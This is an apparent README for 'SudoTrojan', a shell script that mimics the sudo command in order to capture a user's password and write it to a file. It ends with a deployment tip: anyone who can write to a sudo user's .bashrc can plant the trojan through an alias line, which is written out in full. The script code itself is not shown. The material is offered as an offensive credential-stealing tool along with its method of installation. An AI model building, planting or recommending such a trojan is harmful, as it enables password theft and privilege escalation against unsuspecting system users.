# SudoTrojan
A shell script that behaves like the sudo program

## Description
This is just a little thing I whipped up while I was messing around. It's pretty self expanatory. It behaves like the sudo program 
but it takes the password and writes it to an arbitrary file. It doesn't support the sudo arguments at the moment, so if you pass
sudo arguments the script will ignore them or break depending on how they're passed. A possible use for this is if you get access 
to a *nix system and can write to a sudo user's .bashrc. All you'd have to do is put this in the .bashrc with the other aliases: 
`alias sudo="./path/to/sudo/trojan.sh`
